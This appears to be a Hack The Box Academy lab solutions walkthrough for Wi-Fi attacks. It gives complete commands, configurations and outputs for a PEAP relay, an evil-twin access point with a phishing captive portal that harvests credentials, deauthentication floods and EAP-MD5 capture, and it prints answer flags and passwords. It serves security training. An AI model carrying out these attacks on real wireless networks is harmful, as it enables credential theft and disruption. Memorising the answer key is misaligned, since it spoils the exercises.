### "Connect to the HTB-Corp WiFi network using the obtained credentials. What is the value of the flag at 192.168.1.1?"

Students will reuse the previously established RDP session and will terminate the `hostapd-wep` process using the key combination `Ctrl + C` and will disable the monitor mode on `wlan0mon` (`wlan0`) using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng stop wlan0mon
```

```
root@HTB-Corp:/home/wifi# sudo airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy2	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy2]wlan0)

		(mac80211 monitor mode vif disabled for [phy2]wlan0mon)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Next, students will create a wpa\_supplicant configuration file using the credentials found earlier to connect to the `HTB-Corp` network:

Code: shell

```shell
cat << EOF > wpa.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="HTB\Sentinal.Jr"
  password="september"
}
EOF
```

```
root@HTB-Corp:/home/wifi# cat << EOF > wpa.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="HTB\{hidden}"
  password="{hidden}"
}
EOF
```

Students will use the configuration file (`wpa.conf` ) to connect to the `HTB-Corp` network using `wpa_supplicant` and the `wlan0` interface:

Code: shell

```shell
sudo wpa_supplicant -c wpa.conf -i wlan0
```

```
root@HTB-Corp:/home/wifi# sudo wpa_supplicant -c wpa.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device

<SNIP>

EAP-MSCHAPV2: Authentication succeeded
wlan0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan0: PMKSA-CACHE-ADDED 54:8c:a0:e8:df:b1 0
wlan0: WPA: Key negotiation completed with 54:8c:a0:e8:df:b1 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to 54:8c:a0:e8:df:b1 completed [id=0 id_str=]
```

In a different terminal, students will use `dhclient` to obtain an IP address from `HTB-Corp` on the `wlan0` interface:

Code: shell

```shell
sudo dhclient wlan0
```

```
root@HTB-Corp:/home/wifi# sudo dhclient wlan0
```

Students will use `wget` to obtain the flag located at the `http://192.168.1.1` address:

Code: shell

```shell
wget http://192.168.1.1
cat index.html
```

```
root@HTB-Corp:/home/wifi# wget http://192.168.1.1

--2025-01-08 12:42:28--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20 [text/html]
Saving to: ‘index.html’

index.html                    100%[=================================================>]      20  --.-KB/s    in 0s      

2025-01-08 12:42:28 (2.59 MB/s) - ‘index.html’ saved [20/20]

root@HTB-Corp:/home/wifi# cat index.html 

{hidden}
```

Answer: `HTB{CapTuR3_MSChap}`

# PEAP Relay Attack

## Question 1

### "Connect to the HTB-Corp WiFi network using the relay attack as demonstrated in this section. What is the value of the flag at 192.168.1.1?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-f0gw7nhwuv]─[~]
└──╼ [★]$ xfreerdp /v:10.129.130.0 /u:wifi /p:wifi /dynamic-resolution 

[00:42:18:236] [106754:106755] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[00:42:18:537] [106754:106755] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[00:42:18:537] [106754:106755] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[00:42:18:549] [106754:106755] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[00:42:18:549] [106754:106755] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[00:42:18:549] [106754:106755] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

They will use `airmon-ng` to enable monitor mode on the `wlan0` interface:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
root@HTB-Corp:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    195 avahi-daemon
    205 NetworkManager
    247 wpa_supplicant

PHY	Interface	Driver		Chipset

phy2	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Next, students will use `airodump-ng` using the `wlan0mon` interface to enumerate available wireless networks and clients connected to them while taking note of both BSSIDs (MAC addresses) of the `HTB-Corp` network. Note the MAC addresses are subject to change upon target spawn/reset:

Code: shell

```shell
airodump-ng wlan0mon -c 1
```

```
root@HTB-Corp:/home/wifi# airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 12 s ][ 2025-01-09 06:45 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 DC:4B:03:39:BD:7A  -28 100      150        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp                                       

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 DC:4B:03:39:BD:7A  56:01:E5:AA:7B:96  -29   36 - 2      0        4 
```

Students will terminate the `airodump-ng` process using the key combination `Ctrl + C` and will generate a private key for the Certificate Authority (CA) using `openssl` and the `genrsa` command:

Code: shell

```shell
openssl genrsa -out ca.key 2048
```

```
root@HTB-Corp:/home/wifi# openssl genrsa -out ca.key 2048
```

They will proceed to generate a self-signed CA certificate while providing appropriate information using `openssl` and the `req` command:

Code: shell

```shell
openssl req -new -x509 -days 365 -key ca.key -out ca.pem
US
California
San Francisco
Hack The Box
HTB
HTB
student@htb.com
```

```
root@HTB-Corp:/home/wifi# openssl req -new -x509 -days 365 -key ca.key -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:student@htb.com
```

Students will generate a private key for the server using `openssl` and the `genrsa` command:

Code: shell

```shell
openssl genrsa -out server.key 2048
```

```
root@HTB-Corp:/home/wifi# openssl genrsa -out server.key 2048
```

Students will generate a Certificate Signing Request (CSR) using the previously created server private key using `opeensl` and the `req` command and specify the appropriate information, and this time they will not provide any keyword for the challenge:

Code: shell

```shell
openssl req -new -key server.key -out server.CA.csr
US
California
San Francisco
Hack The Box
HTB
HTB
student@admin.htb
```

```
root@HTB-Corp:/home/wifi# openssl req -new -key server.key -out server.CA.csr

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:student@admin.htb

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Students will generate the Diffie-Hellman parameters for the key exchange using `openssl` and the `dhparam` command:

Code: shell

```shell
openssl dhparam -out dhparam.pem 2048
```

```
root@HTB-Corp:/home/wifi# openssl dhparam -out dhparam.pem 2048

Generating DH parameters, 2048 bit long safe prime
..............................................+.............................+...............................

<SNIP>
```

At last, students will sign the server's CSR with the CA key and certificate using `openssl` and the `x509` command:

Code: shell

```shell
openssl x509 -req -in server.CA.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.pem -days 365
```

```
root@HTB-Corp:/home/wifi# openssl x509 -req -in server.CA.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.pem -days 365

Certificate request self-signature ok
subject=C=US, ST=California, L=San Francisco, O=Hack The Box, OU=HTB, CN=HTB, emailAddress=student@admin.htb
```

Next, they will create a `hostapd.conf` configuration file:

Code: configuration

```configuration
# Interface configuration
interface=wlan1
ssid=HTB-Corp
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user
eapol_key_index_workaround=0

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

# Certificate Configuration
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
dh_file=dhparam.pem

# Sycophant Configuration
enable_sycophant=1
sycophant_dir=/tmp/
```

Subsequently, students will create a `hostapd.eap_user` configuration file, holding information about the authentication protocols starting from the least secure:

Code: configuration

```configuration
*       PEAP,TTLS,TLS,MD5,GTC
"t"TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP   "challenge1234"[2]
```

Students will use `hostapd-mana` to start the fake access point running on the `wlan1` interface using the previously created configuration (`hostapd.conf`):

Code: shell

```shell
hostapd-mana ./hostapd.conf
```

```
root@HTB-Corp:/home/wifi# hostapd-mana ./hostapd.conf

Configuration file: ./hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
MANA: Sycohpant state directory set to /tmp/.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr e6:85:dd:08:eb:60 and ssid "HTB-Corp"
random: Only 16/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
```

Students will open a new terminal, switch to the `root` user, and take a note of the MAC address of the `wlan1` interface using `ifconfig`, they will change their current working directory to `/opt/wpa_sycophant`:

Code: shell

```shell
sudo -s
ifconfig wlan1 | grep ether | awk '{print $2}'
cd /opt/wpa_sycophant
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# ifconfig wlan1 | grep ether | awk '{print $2}'

e6:85:dd:08:eb:60

root@HTB-Corp:/home/wifi# cd /opt/wpa_sycophant
```

Subsequently, students will create a `wpa_sycophant.config` file where they will take the previously obtained MAC address of the `wlan1` interface and are going to place the value in the `bssid_blacklist` variable:

Code: configuration

```configuration
network={
  ssid="HTB-Corp"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity=""
  anonymous_identity=""
  password=""
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  bssid_blacklist=e6:85:dd:08:eb:60
}
```

Students will use `wpa_sycophant.sh` and specify the `wpa_sycophant.config` configuration file using the `-c` option to initiate the relay on the `wlan2` interface using the `-i` option:

Code: shell

```shell
/opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.config -i wlan2
```

```
root@HTB-Corp:/opt/wpa_sycophant# /opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.config -i wlan2

SYCOPHANT : RUNNING "./wpa_supplicant/wpa_supplicant -i wlan2 -c wpa_sycophant.config"
SYCOPHANT : RUNNING "dhclient wlan2"
Successfully initialized wpa_sycophant
                                                     _                 _   
 __      ___ __   __ _     ___ _   _  ___ ___  _ __ | |__   __ _ _ __ | |_ 
 \ \ /\ / / '_ \ / _\` |   / __| | | |/ __/ _ \| '_ \| '_ \ / _\` | '_ \| __|
  \ V  V /| |_) | (_| |   \__ \ |_| | (_| (_) | |_) | | | | (_| | | | | |_ 
   \_/\_/ | .__/ \__,_|___|___/\__, |\___\___/| .__/|_| |_|\__,_|_| |_|\__|
          |_|        |_____|   |___/          |_|                          

The most important part is the ascii art - Georg-Christian Pranschke

Set MANA to relay
```

Next, students will open a new terminal, switch to the `root` user, and are going to perform de-authentication using `aireplay-ng` and the obtained BSSIDs (MAC address) earlier:

Code: shell

```shell
sudo -s
aireplay-ng -0 10 -c 56:01:E5:AA:7B:96 -a DC:4B:03:39:BD:7A wlan0mon
```

```
root@HTB-Corp:/home/wifi# aireplay-ng -0 10 -c 56:01:E5:AA:7B:96 -a DC:4B:03:39:BD:7A wlan0mon

07:17:26  Waiting for beacon frame (BSSID: DC:4B:03:39:BD:7A) on channel 1
07:17:26  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:26  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:27  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:28  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:28  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:29  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:29  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:30  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:30  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
07:17:31  Sending 64 directed DeAuth (code 7). STMAC: [56:01:E5:AA:7B:96] [ 0| 0 ACKs]
```

Students will notice the connection event in the `wpa_supplicant` process:

```
root@HTB-Corp:/opt/wpa_sycophant# /opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.config -i wlan2

SYCOPHANT : RUNNING "./wpa_supplicant/wpa_supplicant -i wlan2 -c wpa_sycophant.config"
SYCOPHANT : RUNNING "dhclient wlan2"
Successfully initialized wpa_sycophant

<SNIP>

EAP-MSCHAPV2: Authentication succeeded
wlan2: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan2: PMKSA-CACHE-ADDED dc:4b:03:39:bd:7a 0
wlan2: WPA: Key negotiation completed with dc:4b:03:39:bd:7a [PTK=CCMP GTK=CCMP]
wlan2: CTRL-EVENT-CONNECTED - Connection to dc:4b:03:39:bd:7a completed [id=0 id_str=]
```

Next, students will verify the successful connection to the `HTB-Corp` network by querying information about the IP address on the `wlan2` using `ifconfig`, finding out that they are connected to the `192.168.1.0/24` subnet:

Code: shell

```shell
ifconfig wlan2 | grep inet | awk '{print $2}'
```

```
root@HTB-Corp:/home/wifi# ifconfig wlan2 | grep inet | awk '{print $2}'

192.168.1.12
```

Subsequently, students will use `wget` to obtain the flag from `http://192.168.1.1`:

Code: shell

```shell
wget http://192.168.1.1
cat index.html
```

```
root@HTB-Corp:/home/wifi# wget http://192.168.1.1

--2025-01-09 07:22:01--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27 [text/html]
Saving to: ‘index.html’

index.html          100%[===================>]      27  --.-KB/s    in 0s      

2025-01-09 07:22:01 (699 KB/s) - ‘index.html’ saved [27/27]

root@HTB-Corp:/home/wifi# cat index.html 

{hidden}
```

Answer: `HTB{P3@P_R3lAY_!s_Aw3S0me}`

# Attacking EAP-TLS Authentication

## Question 1

### "Perform the attack as demonstrated in this section. What is the username that logs into the captive portal?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-f0gw7nhwuv]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.251 /u:wifi /p:wifi /dynamic-resolution 

[00:42:18:236] [106754:106755] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[00:42:18:537] [106754:106755] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[00:42:18:537] [106754:106755] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[00:42:18:549] [106754:106755] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[00:42:18:549] [106754:106755] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[00:42:18:549] [106754:106755] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

They will use `airmon-ng` to enable monitor mode on the `wlan0` interface:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
root@HTB-Corp:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    195 avahi-daemon
    205 NetworkManager
    247 wpa_supplicant

PHY	Interface	Driver		Chipset

phy2	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Next, students will use `airodump-ng` to capture the network traffic collected by the `wlan0mon` interface and save it to a file while taking note of the BSSIDs (MAC addresses) of the `HTB-Corp` network and the client connected to it. The MAC addresses are subject to change upon spawn/reset of the target.

Code: shell

```shell
airodump-ng wlan0mon -c 1 -w Student
```

```
root@HTB-Corp:/home/wifi# airodump-ng wlan0mon -c 1 -w Student

 CH  1 ][ Elapsed: 1 min ][ 2025-01-09 11:22 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100      700       53    0   1   54   WPA2 CCMP   MGT  HTB-Corp                           

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  F2:52:84:C4:CB:75  -29   48 -54      0       41                                                
 (not associated)   FE:FA:15:0B:33:58  -49    0 - 1      0        2                                                
 (not associated)   E6:AE:09:E1:7A:98  -49    0 - 1      0        2
```

Next, students open a new terminal, switch to the root user, and copy the `hostapd-wpe.conf` configuration file to their current working directory, and will change the value of the `interface` to `wlan1` and the value of the `ssid` from `hostapd-wpe` to `HTB-Corp`:

Code: shell

```shell
sudo -s
cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
sed -i "s/wlan0/wlan1/g" hostapd-wpe.conf 
sed -i "s/ssid=hostapd-wpe/ssid=HTB-Corp/g" hostapd-wpe.conf
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
root@HTB-Corp:/home/wifi# sed -i "s/wlan0/wlan1/g" hostapd-wpe.conf 
root@HTB-Corp:/home/wifi# sed -i "s/ssid=hostapd-wpe/ssid=HTB-Corp/g" hostapd-wpe.conf
```

Students will recompile the `hostapd-wep` binary to patch to the `hostapd-2.6` source code:

Code: shell

```shell
cd /opt/hostapd-2.6 && patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
```

```
root@HTB-Corp:/home/wifi# cd /opt/hostapd-2.6 && patch -p1 < ../hostapd-wpe/hostapd-wpe.patch

patching file hostapd/.config
patching file hostapd/config_file.c
patching file hostapd/hostapd-wpe.conf
patching file hostapd/hostapd-wpe.conf.bak
patching file hostapd/hostapd-wpe.eap_user
patching file hostapd/hostapd-wpe.log
patching file hostapd/main.c

<SNIP>
```

Subsequently, students will change the value of the `eap_server_tls_ssl_init` in the `if` statement on line 80 in the `eap_server_tls.c` file located in the `/opt/hostapd-2.6/src/eap_server/` directory using a text editor of choice:

Code: txt

```txt
if (eap_server_tls_ssl_init(sm, &data->ssl, 0, EAP_TYPE_TLS)) {
```

Students will recompile the `hostapd` binary using `make`:

Code: shell

```shell
cd /opt/hostapd-2.6/hostapd &&  make
```

```
root@HTB-Corp:/opt/hostapd-2.6# cd /opt/hostapd-2.6/hostapd &&  make

  CC  main.c
  CC  config_file.c
  CC  ../src/ap/hostapd.c
  CC  ../src/ap/wpa_auth_glue.c

<SNIP>
```

Students will use the recompiled version of the binary with the previously created configuration file located in the `/home/wifi` directory to start the fake access point:

Code: shell

```shell
/opt/hostapd-2.6/hostapd/hostapd-wpe /home/wifi/hostapd-wpe.conf
```

```
root@HTB-Corp:/opt/hostapd-2.6/hostapd# /opt/hostapd-2.6/hostapd/hostapd-wpe /home/wifi/hostapd-wpe.conf

Configuration file: /home/wifi/hostapd-wpe.conf
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr e6:ae:09:e1:7a:98 and ssid "HTB-Corp"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
```

They will open a new terminal, switch to the `root` user, navigate to the `/opt/Nagaw` directory, and use the `nagaw.py` Python script to create a fake captive portal using the `demo` template:

Code: shell

```shell
sudo -s
cd /opt/Nagaw
python2 nagaw.py -i wlan1 -o wlan2 -t demo
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# cd /opt/Nagaw
root@HTB-Corp:/opt/Nagaw# python2 nagaw.py -i wlan1 -o wlan2 -t demo

[*] Starting at 2025-01-09 12:00 ...
[*] Starting dnsmasq ...
[*] Cleaning iptables rules from the system ...
[*] Configuring NAT for providing Internet via wlan2 ...
[*] Configuring iptables for redirecting HTTP(s) to this host ...
[*] Loading phishing scenarios from /opt/Nagaw/template-pages ...
[*] Selecting "Victim Company WiFi Login Page" template ...
[*] Starting HTTP/HTTPS server at ports 80/443 ...
```

Next, students will open a new terminal, switch to the `root` user, and use `aireplay-ng` to perform de-authentication using the previously obtained BSSIDs (MAC addresses) of the `HTB-Corp` network and the client connected to it:

Code: shell

```shell
sudo -s
sudo aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c F2:52:84:C4:CB:75 wlan0mon
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# sudo aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c F2:52:84:C4:CB:75 wlan0mon

12:04:08  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
12:04:08  Sending 64 directed DeAuth (code 7). STMAC: [F2:52:84:C4:CB:75] [ 0| 0 ACKs]
12:04:09  Sending 64 directed DeAuth (code 7). STMAC: [F2:52:84:C4:CB:75] [ 0| 0 ACKs]
12:04:09  Sending 64 directed DeAuth (code 7). STMAC: [F2:52:84:C4:CB:75] [ 0| 0 ACKs]
```

After conducting the de-authentication, students will notice the captured credentials of the user in the `nagaw.py` process, alongside the username:

```
root@HTB-Corp:/opt/Nagaw# python2 nagaw.py -i wlan1 -o wlan2 -t demo

[*] Starting at 2025-01-09 12:00 ...
[*] Starting dnsmasq ...
[*] Cleaning iptables rules from the system ...
[*] Configuring NAT for providing Internet via wlan2 ...
[*] Configuring iptables for redirecting HTTP(s) to this host ...
[*] Loading phishing scenarios from /opt/Nagaw/template-pages ...
[*] Selecting "Victim Company WiFi Login Page" template ...
[*] Starting HTTP/HTTPS server at ports 80/443 ...
[+] New Credentials obtained from 10.0.0.89 :
    -> {u'username': u'{hidden}', u'password': u'{hidden}'}
[*] Providing internet access to 10.0.0.89 ...
```

Answer: `Beast`

# Attacking EAP-TLS Authentication

## Question 2

### "Perform the attack as demonstrated in this section. What is the password for the user who logs into the captive portal?"

Students will reuse the previously established RDP session and the credentials collected by the fake captive portal by `nagaw.py` to find the password of the user:

```
root@HTB-Corp:/opt/Nagaw# python2 nagaw.py -i wlan1 -o wlan2 -t demo

[*] Starting at 2025-01-09 12:00 ...
[*] Starting dnsmasq ...
[*] Cleaning iptables rules from the system ...
[*] Configuring NAT for providing Internet via wlan2 ...
[*] Configuring iptables for redirecting HTTP(s) to this host ...
[*] Loading phishing scenarios from /opt/Nagaw/template-pages ...
[*] Selecting "Victim Company WiFi Login Page" template ...
[*] Starting HTTP/HTTPS server at ports 80/443 ...
[+] New Credentials obtained from 10.0.0.89 :
    -> {u'username': u'{hidden}', u'password': u'{hidden}'}
[*] Providing internet access to 10.0.0.89 ...
```

Answer: `S3ntinal_123`

# Cracking EAP-MD5

## Question 1

### "Perform the attack as demonstrated in this section. What is the username found from "Response, Identity"?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-dr1pukrn12]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.67 /u:wifi /p:wifi /dynamic-resolution 

[00:18:20:586] [83675:83676] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[00:18:20:887] [83675:83676] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[00:18:20:887] [83675:83676] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[00:18:20:900] [83675:83676] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[00:18:20:900] [83675:83676] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[00:18:20:900] [83675:83676] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and will enable monitor mode on the `wlan0` interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@HTB-Corp:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    179 avahi-daemon
    195 avahi-daemon
    209 NetworkManager
    276 wpa_supplicant

PHY	Interface	Driver		Chipset

phy2	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Next, students will utilize `airodump-ng` to capture the traffic on channel one using the `wlan0mon` interface and save it into a `.cap` file for further analysis:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 -w Student
```

```
wifi@HTB-Corp:~$ sudo airodump-ng wlan0mon -c 1 -w Student

06:30:23  Created capture file "Student-01.cap".

 CH  1 ][ Elapsed: 1 min ][ 2025-01-10 06:32 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9B:02:B5:DD:B1  -28 100     1013       14    0   1   54   WPA2 CCMP   MGT  HTB-Corp                         

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   E2:5B:A8:87:7A:F2  -49    0 - 1      0        2                                              
 (not associated)   A6:E0:41:FA:DA:BC  -49    0 - 1      0        2                                              
 9C:9B:02:B5:DD:B1  22:03:6B:2A:6D:8C  -29    1 - 1     36      135         HTB-Corp 
```

Students will capture the traffic for approximately a minute and terminate the `airodump-ng` process using the key combination `Ctrl + C`. Subsequently, the students will use `wireshark` to perform further analysis on the packet capture:

Code: shell

```shell
wireshark Student-01.cap
```

```
wifi@HTB-Corp:~$ wireshark Student-01.cap
```

Students will apply the `eap` filter and scrutinize packets that are related to `Response, Identity` to attain the username by expanding the `Extensible Authentication Protocol` header and focusing on the `Identity` field:

Code: shell

```shell
eap
```

![[HTB Solutions/Others/z. images/7ccfab9bd7c609ad02e2e17bd32b69ec_MD5.jpg]]

Answer: `x3dnesse`

# Cracking EAP-MD5

## Question 2

### "Perform the attack as demonstrated in this section. What is the password of the user?"

Students will reuse the previously established RDP session and proceed to scrutinize packets related to `Request, MD5-Challenge EAP (EAP-MD5-CHALLENGE)` while looking into the `Extensible Authentication Protocol` header and take note of the `Id:` and `EAP-MD5 Value:` fields using the previously set `eap` filter in Wireshark:

Code: shell

```shell
eap
```

![[HTB Solutions/Others/z. images/3401d768900478b70e3d7bbd9f0b6c0f_MD5.jpg]]

Subsequently, students will find a `Response, MD5-Challenge EAP (EAP-MD5-CHALLENGE)`packet and will take note of the `EAP-MD5 Value:` value:

![[HTB Solutions/Others/z. images/2e249eb7f9f6796ab6acbdc1c690606f_MD5.jpg]]

Students will open a new terminal and will take both values from the `Request, MD5-Challenge EAP`, and `Response, MD5-Challenge EAP`, and convert them into colon hexadecimal format using `sed`:

Code: shell

```shell
echo 8be0b3ab8f813c69584164a1cbf72257 | sed 's/\(..\)/\1:/g;s/:$//'
